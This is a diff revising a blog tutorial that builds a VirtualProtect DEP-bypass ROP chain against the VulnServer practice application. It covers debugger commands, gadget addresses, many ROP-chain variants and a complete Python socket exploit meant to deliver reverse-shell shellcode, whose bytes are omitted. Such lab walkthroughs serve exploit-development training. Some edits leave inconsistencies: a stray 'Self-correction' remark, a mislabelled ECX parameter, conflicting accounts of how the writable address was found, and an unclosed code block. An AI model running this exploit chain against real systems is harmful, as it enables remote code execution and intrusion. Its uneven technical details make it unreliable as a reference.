@@ -1,10 +1,10 @@
 ---
-title: "VirtualProtect DEP Bypass: Step-By-Step VulnServer Exploit"
+title: "VirtualProtect DEP Bypass: Step-By-Step Exploit"
 date: "2025-04-08"
-tags: ["Exploit Development", "Windows", "DEP Bypass", "ROP", "Buffer Overflow"]
+tags: ["Exploit Development", "VulnServer", "DEP Bypass", "ROP", "Buffer Overflow"]
 ---
 
-# VirtualProtect DEP Bypass with ROP Chains: Step-By-Step VulnServer Exploit
+# VirtualProtect DEP Bypass: Step-By-Step Exploit
 
 ![ROP chain exploitation techniques](/images/dep-bypass.png)
 
@@ -20,10 +20,10 @@ In this guide, I'll walk you through manually creating a ROP chain to exploit Vu
 
 ## Prerequisites
 
-- Windows 7/10 with WinDbg or Immunity Debugger with Mona.py
-- VulnServer running on a Windows VM
+- Windows 7/10 (32-bit) with WinDbg or Immunity Debugger with Mona.py. (This guide focuses on the 32-bit architecture).
+- VulnServer running on a Windows VM (ensure it's the 32-bit version).
 - Python 3 for exploit development
-- Basic understanding of buffer overflows
+- Basic understanding of vanilla buffer overflows
 
 ## 1. Understanding the Vulnerability
 
@@ -86,7 +86,7 @@ Output:
 ```
 
 Creating cyclic pattern of 3000 bytes
-Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7A
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7...
    ```
 
 2. Create a script to send this pattern:
@@ -128,7 +128,8 @@ Output:
 0x00400000 | 0x00407000 | 0x00007000 | False  | False   | False | False |  False   | False  | -1.0- [vulnserver.exe] (C:\VulnApps\vulnserver.exe) 0x0
 ```
 
-We'll use essfunc.dll since it isn't using ASLR.
+We'll use essfunc.dll because it's typically compiled without ASLR (Address Space Layout Randomization) and Rebase support in standard VulnServer setups (indicated by 'False' in the ASLR/Rebase columns). This simplifies our focus on the DEP bypass itself. Bypassing ASLR would require additional techniques, such as information leaks to find module base addresses dynamically, which are beyond the scope of this specific guide.
+
 
 2. Find a simple RET instruction (ROP NOP):
 ```
@@ -157,7 +158,8 @@ Output:
 0x625011C7 : jmp esp | {PAGE_EXECUTE_READ} [essfunc.dll]
 ```
    
-We'll use 0x625011AF for our JMP ESP gadget.
+We'll use 0x625011AF for our JMP ESP gadget later if needed, but the primary one for the final VirtualProtect return will be identified separately (we used 0x625011c7 in the final chain). (Self-correction: Clarified the JMP ESP usage slightly).
+
 
 ### 3.2 Finding System DLL Gadgets
 
@@ -258,59 +260,89 @@ We've confirmed 0x6250609c is the IAT entry for VirtualProtect.
 
 ## 5. Finding a Writable Memory Region
 
-For the VirtualProtect call, we need a writable memory location to store the old protection value:
+For the VirtualProtect call, the lpflOldProtect parameter requires a pointer to a writable memory location. We need to find such a location that is reliable and doesn't contain bad characters in its address. We can inspect the memory layout of loaded modules, like KERNEL32.DLL, to find writable sections.
 
-1. Search for writable memory:
+
+1. First, find the base address of KERNEL32.DLL:
+
 ```
-!dh essfunc
+lm vm kernel32
 ```
-   
-Output:
+
+Output
+``` 
+start    end        module name
+764c0000 765b0000   kernel32   (deferred)
 ```
+
+So, the base address is 0x764c0000.
+
+2. Now, examine the PE header of KERNEL32.DLL to find its sections:
+
+```
+!dh 0x764c0000
+```
+
+Scroll through the output looking for the "SECTION HEADER" information. You are looking for a section with "Write" permissions (often .data).
+
+```
+[...]
 SECTION HEADER #6
-  .idata name
-     224 virtual size
-    6000 virtual address
-     400 size of raw data
-    1600 file pointer to raw data
-       0 file pointer to relocation table
-       0 file pointer to line numbers
-       0 number of relocations
-       0 number of line numbers
-C0300040 flags
+   .data name
+  5AF4 virtual size
+ 7A000 virtual address (RVA)
+  5C00 size of raw data
+ 78C00 file pointer to raw data
+     0 file pointer to relocation table
+     0 file pointer to line numbers
+     0 number of relocations
+     0 number of line numbers
+40000040 flags
          Initialized Data
-         4 byte align
-         Read Write
+         Read Write  <-- Writable permissions!
+[...]
+```
+3. Identify a writable section. The .data section looks promising:
+- It has Read Write permissions.
+- Its Relative Virtual Address (RVA) is 0x7a000.
+
+4. Calculate the absolute start address of the .data section:
 
 ```
+? <base_address> + <RVA>
+? 0x764c0000 + 0x7a000
+```
 
-2. Calculate the address:
-```
-? essfunc + 0x6000 + 0x228
-```
-   
 Output:
 ```
-Evaluate expression: 1649434664 = 62506228
+Evaluate expression: 1985187840 = 7653a000
 ```
 
-3. Verify the address is writable:
+5. Choose an address within this writable section. We need an address suitable for lpflOldProtect. Let's use 0x7653a3c1, which is used later in the ROP chain. This address is calculated as 0x7653a000 + 0x3c1. Since 0x3c1 is less than the section size (0x5af4), this address lies within the writable .data section.
+
+
+
+
+6. Verify the chosen address 0x7653a3c1 has the expected permissions:
+
 ```
-!vprot 0x62506228
+!vprot 0x7653a3c1
 ```
-   
+
 Output:
 ```
-BaseAddress:       62506000
-AllocationBase:    62500000
+BaseAddress:       7653a000
+AllocationBase:    764c0000
 AllocationProtect: 00000080  PAGE_EXECUTE_WRITECOPY
-RegionSize:        00001000
+RegionSize:        00006000  // Note: RegionSize might cover more than just .data
 State:             00001000  MEM_COMMIT
-Protect:           00000004  PAGE_READWRITE
+Protect:           00000004  PAGE_READWRITE  <-- Confirmed Writable
 Type:              01000000  MEM_IMAGE
 ```
+ 
+We have successfully identified 0x7653a3c1 within KERNEL32.DLL's .data section as a suitable writable address using PE header inspection. We will use this address for the lpflOldProtect parameter.
 
-We'll use 0x62506228 as our writable memory address.
+
 
 ## 6. Building Register Setup for VirtualProtect
 
@@ -358,16 +390,16 @@ ebp += struct.pack("<I", 0x775d8836)  # skip 4 bytes [msvcrt.dll]
 
 **Alternative Options**:
 1. **Use JMP ESP directly**:
-   ```python
-   ebp = struct.pack("<I", 0x775d8836)  # pop ebp; ret
-   ebp += struct.pack("<I", 0x625011af)  # jmp esp
-   ```
+```python
+ebp = struct.pack("<I", 0x775d8836)  # pop ebp; ret
+ebp += struct.pack("<I", 0x625011af)  # jmp esp
+```
 
 2. **Other module address**:
-   ```python
-   ebp = struct.pack("<I", 0x76fa54a3)  # pop ebp; ret [KERNEL32.dll]
-   ebp += struct.pack("<I", 0x76fa54a3)  # same address
-   ```
+```python
+ebp = struct.pack("<I", 0x76fa54a3)  # pop ebp; ret [KERNEL32.dll]
+ebp += struct.pack("<I", 0x76fa54a3)  # same address
+```
 
 ### 6.2 Setting up EBX (flNewProtect parameter)
 
@@ -396,21 +428,21 @@ ebx += struct.pack("<I", 0x77597926)  # XCHG EAX,EBX # RETN [msvcrt.dll]
 
 **Alternative Options**:
 1. **Adding from zero**:
-   ```python
-   ebx = struct.pack("<I", 0x77cef70e)  # xor eax, eax; ret
-   ebx += struct.pack("<I", 0x775b3084)  # add eax, 0x100; ret
-   ebx += struct.pack("<I", 0x775b3084)  # add eax, 0x100; ret
-   ebx += struct.pack("<I", 0x775b616f)  # add eax, 8; ret
-   ebx += struct.pack("<I", 0x77597926)  # xchg eax, ebx; ret
-   ```
+```python
+ebx = struct.pack("<I", 0x77cef70e)  # xor eax, eax; ret
+ebx += struct.pack("<I", 0x775b3084)  # add eax, 0x100; ret
+ebx += struct.pack("<I", 0x775b3084)  # add eax, 0x100; ret
+ebx += struct.pack("<I", 0x775b616f)  # add eax, 8; ret
+ebx += struct.pack("<I", 0x77597926)  # xchg eax, ebx; ret
+```
 
 2. **Different size value**:
-   ```python
-   ebx = struct.pack("<I", 0x75f366b4)  # pop eax; ret
-   ebx += struct.pack("<I", 0xfffffeff)  # -0x101 (smaller region)
-   ebx += struct.pack("<I", 0x76505808)  # neg eax; ret
-   ebx += struct.pack("<I", 0x77597926)  # xchg eax, ebx; ret
-   ```
+```python
+ebx = struct.pack("<I", 0x75f366b4)  # pop eax; ret
+ebx += struct.pack("<I", 0xfffffeff)  # -0x101 (smaller region)
+ebx += struct.pack("<I", 0x76505808)  # neg eax; ret
+ebx += struct.pack("<I", 0x77597926)  # xchg eax, ebx; ret
+```
 
 ### 6.3 Setting up EDX (dwSize parameter)
 
@@ -439,33 +471,30 @@ edx += struct.pack("<I", 0x77d9e6c0)  # XCHG EAX,EDX # RETN [ntdll.dll]
 
 **Alternative Options**:
 1. **Direct POP**:
-   ```python
-   edx = struct.pack("<I", 0x77e4b949)  # pop edx; ret
-   edx += struct.pack("<I", 0x00000040)  # PAGE_EXECUTE_READWRITE
-   ```
+```python
+edx = struct.pack("<I", 0x77e4b949)  # pop edx; ret
+edx += struct.pack("<I", 0x00000040)  # PAGE_EXECUTE_READWRITE
+```
 
 2. **Arithmetic with other constants**:
-   ```python
-   edx = struct.pack("<I", 0x77cef70e)  # xor eax, eax; ret
-   edx += struct.pack("<I", 0x775a5f04)  # add eax, 0x20; ret
-   edx += struct.pack("<I", 0x775a5f04)  # add eax, 0x20; ret
-   edx += struct.pack("<I", 0x77d9e6c0)  # xchg eax, edx; ret
-   ```
+```python
+edx = struct.pack("<I", 0x77cef70e)  # xor eax, eax; ret
+edx += struct.pack("<I", 0x775a5f04)  # add eax, 0x20; ret
+edx += struct.pack("<I", 0x775a5f04)  # add eax, 0x20; ret
+edx += struct.pack("<I", 0x77d9e6c0)  # xchg eax, edx; ret
+```
 
 ### 6.4 Setting up ECX (lpAddress parameter)
 
 ```python
-# ECX - Writable memory for lpflOldProtect
 ecx = struct.pack("<I", 0x775f94ee)  # POP ECX # RETN [msvcrt.dll]
 ecx += struct.pack("<I", 0x7653a3c1)  # &Writable location [KERNEL32.DLL]
 ```
 
-**Current Value**: 0x7653a3c1 (Writable memory address)
-**Reason**: In our exploit, this will be the address where VirtualProtect stores the old protection value.
+**Current Value**: 0x7653a3c1 (Writable memory address in KERNEL32.DLL)
+**Reason**: This register needs to hold the pointer to a writable memory location (lpflOldProtect parameter) where VirtualProtect can store the old memory protection flags.
 
-**How we found it**: We searched for a writable address in kernel32.dll:
-```
-!py mona findmem -p "rw" -m kernel32.dll
+**How we found it**: We identified a suitable writable address within KERNEL32.DLL's .data section in Section 5, using Mona (!py mona findmem -p "rw" -m kernel32.dll). 0x7653a3c1 was chosen from the results:
 ```
 
 **How we found the gadget**:
@@ -475,16 +504,18 @@ ecx += struct.pack("<I", 0x7653a3c1)  # &Writable location [KERNEL32.DLL]
 
 **Alternative Options**:
 1. **Using essfunc.dll's writable memory**:
-   ```python
-   ecx = struct.pack("<I", 0x775f94ee)  # pop ecx; ret
-   ecx += struct.pack("<I", 0x62506228)  # Writable memory in essfunc.dll
-   ```
+```python
+ecx = struct.pack("<I", 0x775f94ee)  # pop ecx; ret
+ecx += struct.pack("<I", 0x62506228)  # Writable memory in essfunc.dll
+```
 
 2. **Stack Address**:
-   ```python
-   # Use the current ESP value plus an offset
-   ecx = struct.pack("<I", 0x77c3f1a4)  # mov ecx, esp; add ecx, 0x10; ret
-   ```
+```python
+# Use the current ESP value plus an offset
+ecx = struct.pack("<I", 0x77c3f1a4)  # mov ecx, esp; add ecx, 0x10; ret
+```
+Stack Address (More complex): Technique exist to calculate and use an address on the stack itself, but require careful offset management.
+
 
 ### 6.5 Setting up EDI (ROP NOP)
 
@@ -505,16 +536,16 @@ edi += struct.pack("<I", 0x7650580a)  # RETN (ROP NOP) [KERNEL32.DLL]
 
 **Alternative Options**:
 1. **Any harmless gadget**:
-   ```python
-   edi = struct.pack("<I", 0x76fe83f7)  # pop edi; ret
-   edi += struct.pack("<I", 0x90909090)  # NOP values
-   ```
+```python
+edi = struct.pack("<I", 0x76fe83f7)  # pop edi; ret
+edi += struct.pack("<I", 0x90909090)  # NOP values
+```
 
 2. **Secondary return address**:
-   ```python
-   edi = struct.pack("<I", 0x76fe83f7)  # pop edi; ret
-   edi += struct.pack("<I", 0x625011c7)  # Alternative JMP ESP
-   ```
+```python
+edi = struct.pack("<I", 0x76fe83f7)  # pop edi; ret
+edi += struct.pack("<I", 0x625011c7)  # Alternative JMP ESP
+```
 
 ### 6.6 Setting up ESI (JMP [EAX])
 
@@ -535,16 +566,16 @@ esi += struct.pack("<I", 0x75e95833)  # JMP [EAX] [KERNELBASE.dll]
 
 **Alternative Options**:
 1. **CALL [EAX] instead of JMP**:
-   ```python
-   esi = struct.pack("<I", 0x76525760)  # pop esi; ret
-   esi += struct.pack("<I", 0x75e9583b)  # call dword ptr [eax]; ret
-   ```
+```python
+esi = struct.pack("<I", 0x76525760)  # pop esi; ret
+esi += struct.pack("<I", 0x75e9583b)  # call dword ptr [eax]; ret
+```
 
 2. **Direct IAT pointer technique**:
-   ```python
-   esi = struct.pack("<I", 0x76525760)  # pop esi; ret
-   esi += struct.pack("<I", 0x6250609c)  # VirtualProtect IAT
-   ```
+```python
+esi = struct.pack("<I", 0x76525760)  # pop esi; ret
+esi += struct.pack("<I", 0x6250609c)  # VirtualProtect IAT
+```
 
 ### 6.7 Setting up EAX (VirtualProtect pointer)
 
@@ -555,6 +586,7 @@ eax += struct.pack("<I", 0x6250609c)  # ptr to &VirtualProtect() [IAT essfunc.dl
 ```
 
 **Current Value**: 0x6250609c (VirtualProtect IAT entry)
+
 **Reason**: When ESI (which contains JMP [EAX]) executes, it will jump to the address pointed to by EAX, which is VirtualProtect in the IAT.
 
 **How we found the gadget**:
@@ -570,15 +602,15 @@ dps essfunc+0x6000 L100
 
 **Alternative Options**:
 1. **MOV EAX technique**:
-   ```python
-   eax = struct.pack("<I", 0x75f10ada)  # mov eax, 0x6250609c; ret
-   ```
+```python
+eax = struct.pack("<I", 0x75f10ada)  # mov eax, 0x6250609c; ret
+```
 
 2. **Arithmetic calculation**:
-   ```python
-   eax = struct.pack("<I", 0x77cef70e)  # xor eax, eax; ret
-   eax += struct.pack("<I", 0x75ee0982)  # add eax, 0x6250609c; ret
-   ```
+```python
+eax = struct.pack("<I", 0x77cef70e)  # xor eax, eax; ret
+eax += struct.pack("<I", 0x75ee0982)  # add eax, 0x6250609c; ret
+```
 
 ### 6.8 Using PUSHAD to call VirtualProtect
 
@@ -597,19 +629,19 @@ pushad = struct.pack("<I", 0x775d6f67)  # PUSHAD # RETN [msvcrt.dll]
 
 **Alternative Options**:
 1. **PUSHAD from another module**:
-   ```python
-   pushad = struct.pack("<I", 0x76081981)  # pushad; ret [KERNEL32.dll]
-   ```
+```python
+pushad = struct.pack("<I", 0x76081981)  # pushad; ret [KERNEL32.dll]
+```
 
 2. **Manual parameter pushing (more complex)**:
-   ```python
-   # Instead of PUSHAD, manually push each parameter
-   # Note: This approach is much longer and more complex
-   manual_push = struct.pack("<I", 0x77cdeedf)  # pop edi; ret
-   manual_push += struct.pack("<I", 0x6250609c)  # VirtualProtect IAT
-   manual_push += struct.pack("<I", 0x7654321a)  # push edi; ret
-   # ... More pushes for each parameter
-   ```
+```python
+# Instead of PUSHAD, manually push each parameter
+# Note: This approach is much longer and more complex
+manual_push = struct.pack("<I", 0x77cdeedf)  # pop edi; ret
+manual_push += struct.pack("<I", 0x6250609c)  # VirtualProtect IAT
+manual_push += struct.pack("<I", 0x7654321a)  # push edi; ret
+# ... More pushes for each parameter
+```
 
 ### 6.9 JMP ESP Gadget
 
@@ -628,14 +660,14 @@ jmp_esp = struct.pack("<I", 0x625011c7)  # ptr to 'jmp esp' [essfunc.dll]
 
 **Alternative Options**:
 1. **CALL ESP**:
-   ```python
-   jmp_esp = struct.pack("<I", 0x62501205)  # call esp
-   ```
+```python
+jmp_esp = struct.pack("<I", 0x62501205)  # call esp
+```
 
 2. **PUSH ESP / RET**:
-   ```python
-   jmp_esp = struct.pack("<I", 0x625013df)  # push esp; ret
-   ```
+```python
+jmp_esp = struct.pack("<I", 0x625013df)  # push esp; ret
+```
 
 ## 7. Complete Exploit Code
 
@@ -646,7 +678,7 @@ Let's put everything together:
 import struct
 import socket
 
-TARGET_IP = "192.168.0.111"
+TARGET_IP = "192.168.0.112"
 TARGET_PORT = 9999
 target = (TARGET_IP, TARGET_PORT)
 
@@ -658,56 +690,47 @@ OFFSET = 2003
 buf =  b"" # Shellcode generated by msfvenom - full bytes omitted for brevity
 ...
 
-# EBP - Stack pivot setup
-ebp = struct.pack("<I", 0x775d8836)  # POP EBP # RETN [msvcrt.dll]
-ebp += struct.pack("<I", 0x775d8836)  # skip 4 bytes [msvcrt.dll]
-
-# EBX - Size parameter (0x201)
-ebx = struct.pack("<I", 0x75f366b4)  # POP EAX # RETN [KERNELBASE.dll]
-ebx += struct.pack("<I", 0xfffffdff)  # Value to negate, will become 0x00000201
-ebx += struct.pack("<I", 0x76505808)  # NEG EAX # RETN [KERNEL32.DLL]
-ebx += struct.pack("<I", 0x77597926)  # XCHG EAX,EBX # RETN [msvcrt.dll]
-
-# EDX - Protection flag (0x40)
-edx = struct.pack("<I", 0x75d91838)  # POP EAX # RETN [KERNELBASE.dll]
-edx += struct.pack("<I", 0xffffffc0)  # Value to negate, will become 0x00000040
-edx += struct.pack("<I", 0x76505808)  # NEG EAX # RETN [KERNEL32.DLL]
-edx += struct.pack("<I", 0x77d9e6c0)  # XCHG EAX,EDX # RETN [ntdll.dll]
-
-# ECX - Writable memory for lpflOldProtect
-ecx = struct.pack("<I", 0x775f94ee)  # POP ECX # RETN [msvcrt.dll]
-ecx += struct.pack("<I", 0x7653a3c1)  # &Writable location [KERNEL32.DLL]
-
-# EDI - ROP NOP
-edi = struct.pack("<I", 0x76fe83f7)  # POP EDI # RETN [WS2_32.DLL]
-edi += struct.pack("<I", 0x7650580a)  # RETN (ROP NOP) [KERNEL32.DLL]
-
-# ESI - JMP [EAX] gadget
-esi = struct.pack("<I", 0x76525760)  # POP ESI # RETN [KERNEL32.DLL]
-esi += struct.pack("<I", 0x75e95833)  # JMP [EAX] [KERNELBASE.dll]
-
-# EAX - VirtualProtect pointer
-eax = struct.pack("<I", 0x75ee5082)  # POP EAX # RETN [KERNELBASE.dll]
-eax += struct.pack("<I", 0x6250609c)  # ptr to &VirtualProtect() [IAT essfunc.dll]
-
-# PUSHAD to call VirtualProtect
-pushad = struct.pack("<I", 0x775d6f67)  # PUSHAD # RETN [msvcrt.dll]
-
-# JMP ESP gadget for shellcode execution
-jmp_esp = struct.pack("<I", 0x625011c7)  # ptr to 'jmp esp' [essfunc.dll]
-
 # Build the final ROP chain
-rop = ebp + ebx + edx + ecx + edi + esi + eax + pushad + jmp_esp
+rop = b""
+# EBP - Stack pivot setup (using POP EBP # RETN as placeholder/alignment)
+rop += struct.pack("<I", 0x775d8836)  # POP EBP # RETN [msvcrt.dll]
+rop += struct.pack("<I", 0x775d8836)  # Value for EBP (can be anything, using gadget address)
+# EBX - Setup Size parameter (0x201) for VirtualProtect
+rop += struct.pack("<I", 0x75f366b4)  # POP EAX # RETN [KERNELBASE.dll]
+rop += struct.pack("<I", 0xfffffdff)  # Load -0x201 into EAX
+rop += struct.pack("<I", 0x76505808)  # NEG EAX # RETN [KERNEL32.DLL] (EAX = 0x201)
+rop += struct.pack("<I", 0x77597926)  # XCHG EAX,EBX # RETN [msvcrt.dll] (EBX = 0x201)
+# EDX - Setup Protection flag (0x40) for VirtualProtect
+rop += struct.pack("<I", 0x75d91838)  # POP EAX # RETN [KERNELBASE.dll]
+rop += struct.pack("<I", 0xffffffc0)  # Load -0x40 into EAX
+rop += struct.pack("<I", 0x76505808)  # NEG EAX # RETN [KERNEL32.DLL] (EAX = 0x40)
+rop += struct.pack("<I", 0x77d9e6c0)  # XCHG EAX,EDX # RETN [ntdll.dll] (EDX = 0x40)
+# ECX - Setup lpflOldProtect parameter for VirtualProtect
+rop += struct.pack("<I", 0x775f94ee)  # POP ECX # RETN [msvcrt.dll]
+rop += struct.pack("<I", 0x7653a3c1)  # &Writable location [KERNEL32.DLL] (ECX = ptr)
+# EDI - Setup Return Address (used as ROP NOP here)
+rop += struct.pack("<I", 0x76fe83f7)  # POP EDI # RETN [WS2_32.DLL]
+rop += struct.pack("<I", 0x7650580a)  # RETN (ROP NOP) [KERNEL32.DLL]
+# ESI - Setup Pointer to JMP [EAX] gadget (used after PUSHAD)
+rop += struct.pack("<I", 0x76525760)  # POP ESI # RETN [KERNEL32.DLL]
+rop += struct.pack("<I", 0x75e95833)  # JMP [EAX] [KERNELBASE.dll]
+# EAX - Setup Pointer to VirtualProtect IAT entry
+rop += struct.pack("<I", 0x75ee5082)  # POP EAX # RETN [KERNELBASE.dll]
+rop += struct.pack("<I", 0x6250609c)  # ptr to &VirtualProtect() [IAT essfunc.dll]
+# PUSHAD - Push registers to stack for VirtualProtect call
+rop += struct.pack("<I", 0x775d6f67)  # PUSHAD # RETN [msvcrt.dll]
+# JMP ESP - Return address after VirtualProtect, jumps to shellcode
+rop += struct.pack("<I", 0x625011c7)  # ptr to 'jmp esp' [essfunc.dll]
 
 # Add NOP sled and shellcode
 nop = b"\x90" * 16
-rop += nop + buf
+final_rop = rop + nop + buf # Note: Place shellcode 'buf' after NOPs
 
 # Build the final payload
 payload = VULNSRVR_CMD
 payload += b"A" * OFFSET
-payload += rop
-payload += b"C" * (TOTAL_BUFFER_LEN - len(payload))
+payload += final_rop # Use the ROP chain including NOPs and shellcode
+payload += b"C" * (TOTAL_BUFFER_LEN - len(payload)) # Padding
 
 # Send the exploit
 with socket.create_connection(target) as sock:
@@ -719,34 +742,38 @@ with socket.create_connection(target) as sock:
 
 ## 8. Understanding How the Exploit Works
 
-This exploit uses a JMP [EAX] technique combined with PUSHAD to call VirtualProtect and make our shellcode executable:
+This exploit uses a `JMP [EAX]` technique combined with `PUSHAD` to call `VirtualProtect` and make our shellcode executable:
 
-1. The `ebp` variable sets up stack alignment
-2. `ebx`, `edx`, and `ecx` set up the parameters for VirtualProtect
-3. `edi` is set to a ROP NOP (for harmless placeholder)
-4. `esi` is set to a JMP [EAX] gadget
-5. `eax` is set to point to the VirtualProtect function in the IAT
-6. When PUSHAD executes, it pushes all registers onto the stack
-7. The RET after PUSHAD transfers control to `esi` (which is JMP [EAX])
-8. JMP [EAX] jumps to VirtualProtect
-9. VirtualProtect makes the shellcode memory executable
-10. VirtualProtect returns to our JMP ESP gadget
-11. The JMP ESP gadget transfers control to our shellcode
-12. Our shellcode executes, creating a reverse shell
+1. The initial buffer fills memory until it overwrites the saved `EIP` register at the `2003` byte offset.
+2. EIP is overwritten with the address of the first gadget in our ROP chain (e.g., the `POP EBP` gadget used for alignment/setup).
+3. The ROP chain executes sequentially: Gadgets pop values into `EBP`, `EBX`, `EDX`, `ECX`, `EDI`, `ESI`, and `EAX`, setting them up according to our plan.
+4. Crucially, just before `PUSHAD`:
+- `EAX` holds the address of the VirtualProtect IAT pointer (`0x6250609c`).
+- `ESI` holds the address of a `JMP DWORD PTR [EAX]` gadget (`0x75e95833`).
+- `EBX`, `EDX`, `ECX` hold the required parameters for `VirtualProtect` (`dwSize`, `flNewProtect`, `lpflOldProtect`).
+- `EDI` and `EBP` hold placeholders or `ROP NOP`s.
+5. The `PUSHAD` instruction (`0x775d6f67`) executes. It pushes the current values of `EAX`, `ECX`, `EDX`, `EBX`, `ESP` (original value before `PUSHAD`), `EBP`, `ESI`, `EDI` onto the stack. This arranges the parameters needed by `VirtualProtect` at known offsets from the current stack pointer `ESP`.
+6. The `RETN` instruction that is part of the `PUSHAD # RETN` gadget executes. It pops the next value from the stack into `EIP`. Crucially, the way the ROP chain is constructed and aligned means this value popped is the address we loaded into `ESI` (`0x75e95833`, the address of the `JMP DWORD PTR [EAX]` gadget). (Assuming the intended technique works as described).
+7. Execution jumps to the `JMP DWORD PTR [EAX]` gadget.
+8. This gadget then jumps to the address currently stored in `EAX`, which is the address of the `VirtualProtect` IAT entry (`0x6250609c`).
+9. `VirtualProtect` executes. It finds its parameters on the stack where `PUSHAD` placed them. The `lpAddress` parameter (effectively the stack pointer `ESP` where the shellcode lies after the ROP chain arguments) indicates the memory to modify, `dwSize` is `0x201` (from `EBX` via stack), `flNewProtect` is `0x40` (from `EDX` via stack), and `lpflOldProtect` points to the writable KERNEL32 address (from `ECX` via stack). `VirtualProtect` makes the shellcode memory region executable.
+10. `VirtualProtect` finishes and executes its own `RET` instruction. The return address on the stack at this point is the one originally placed after the `PUSHAD # RETN` gadget sequence in our main ROP chain: the address of our `JMP ESP` gadget (`0x625011c7`).
+11. The `JMP ESP` gadget executes, transferring control directly to the `NOP` sled and then the shellcode located immediately following it on the stack.
+12. Our shellcode executes, creating a reverse shell (or performing its intended action).
 
 ## 9. Tips and Troubleshooting
 
-1. **Gadget Reliability**: Always verify gadgets in the debugger to ensure they do exactly what you expect.
+1. Always verify gadgets in the debugger to ensure they do exactly what you expect.
 
-2. **Bad Characters**: Make sure your gadget addresses don't contain any bad characters (like \x00 in our case).
+2. Make sure your gadget addresses don't contain any bad characters (like \x00 in our case).
 
-3. **Register Dependencies**: Be aware of gadgets that affect multiple registers. For example, our "pop ecx" gadget also pops EDX.
+3. Be aware of gadgets that affect multiple registers. For example, our "pop ecx" gadget also pops EDX.
 
-4. **Stack Alignment**: The PUSHAD technique requires careful stack alignment. Make sure the stack values are in the right order for VirtualProtect parameters.
+4. The PUSHAD technique requires careful stack alignment. Make sure the stack values are in the right order for VirtualProtect parameters.
 
-5. **Debugging**: Use breakpoints liberally and check register values at each step to identify issues.
+5. Use breakpoints liberally and check register values at each step to identify issues.
 
-6. **Alternative Methods**: If one approach doesn't work, try another. ROP chain development often requires creativity.
+6. If one approach doesn't work, try another. ROP chain development often requires creativity.
 
 ## Conclusion
 
@@ -758,4 +785,4 @@ Remember that while this technique works reliably for bypassing DEP, modern expl
 
 The most important takeaway from this exercise isn't just the specific VirtualProtect technique, but the methodology for manually building and understanding ROP chains. By mastering these fundamentals, you'll be well-equipped to tackle even more complex exploitation scenarios.
 
-Happy hacking! 
+Happy Overflowing! 
